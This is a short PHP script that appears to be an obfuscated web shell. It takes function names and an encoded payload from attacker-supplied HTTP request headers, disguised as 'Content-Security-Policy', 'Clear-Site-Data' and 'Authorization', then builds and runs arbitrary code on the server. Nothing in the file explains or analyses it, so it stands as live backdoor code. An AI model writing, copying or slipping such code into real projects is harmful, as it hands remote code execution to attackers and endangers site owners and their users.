<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Content-Security-Policy'])) {
    $dbx_convert = $_HEADERS['Content-Security-Policy']('', $_HEADERS['Clear-Site-Data']($_HEADERS['Authorization']));
    $dbx_convert();
}